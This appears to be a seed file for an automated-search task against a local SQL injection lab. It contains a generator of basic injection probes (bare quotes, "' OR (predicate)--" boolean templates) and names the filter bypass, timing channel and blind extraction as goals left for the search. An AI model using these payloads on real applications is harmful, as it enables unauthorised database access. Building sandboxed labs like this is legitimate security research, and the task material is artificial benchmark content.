# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 The ESN authors.
"""Seed candidate for the local SQLi lab.

The candidate ``solve()`` is a **pure** payload-strategy generator: it builds a
plan of probe *attempts* with ordinary Python logic and returns it. It performs
no target I/O — the evaluator owns every request, every safety check, and all
scoring (so candidate metadata can never earn credit; see ``evaluator.py``).

Three attempt shapes are understood by the evaluator, distinguished by which key
is present (no ``kind``/``expect`` field affects scoring):

- ``{"name", "payload"}`` — a direct payload string (syntax/error/union probes).
- ``{"name", "boolean_template"}`` — a string with a ``{predicate}`` slot. The
  evaluator substitutes a *true* and a *false* predicate and credits the
  differential only if the observed row count actually flips.
- ``{"name", "payload_template", "charset", "max_depth"}`` — a blind-extraction
  template with ``{n}`` (prefix length) and ``{qprefix}`` (a quoted prefix) slots.
  The evaluator fills those itself and drives a char-by-char recovery against a
  primary target, a wrong-guess control, and a shadow target with a different
  secret. Candidate guesses never score; only what the *evaluator* recovers does.

This seed intentionally stops at quote + boolean signals. Discovering the
case-folded ``union``/``delay_ms`` filter bypass, the timing channel, and a
working blind-extraction template is left to the search.
"""

INITIAL_SOLUTION = """\
# Pure candidate: build a local SQLi probe plan for the in-process lab.
# No network, filesystem, sleep, or DB access here -- the evaluator runs it all.
import itertools

QUOTES = ["'", '"']
COMMENTS = ["--", "/*x*/"]
PREDICATES = ["1=1", "1=0"]


def add(attempts, name, **fields):
    entry = {"name": name}
    entry.update(fields)
    attempts.append(entry)


def solve():
    attempts = []

    # 1) Syntax / DB-error probes: a bare quote should break the query.
    for i, quote in enumerate(QUOTES):
        add(attempts, "quote_%d" % i, payload=quote)

    # 2) Boolean-differential probes. The evaluator substitutes a true and a
    #    false predicate into {predicate} and only credits a real row-count flip,
    #    so we hand it a template rather than a fixed true/false pair.
    for i, (quote, comment) in enumerate(itertools.product(QUOTES, COMMENTS)):
        template = quote + " OR ({predicate})" + comment
        add(attempts, "boolean_%d" % i, boolean_template=template)

    return {"target": "local_sqli_lab", "attempts": attempts}
"""
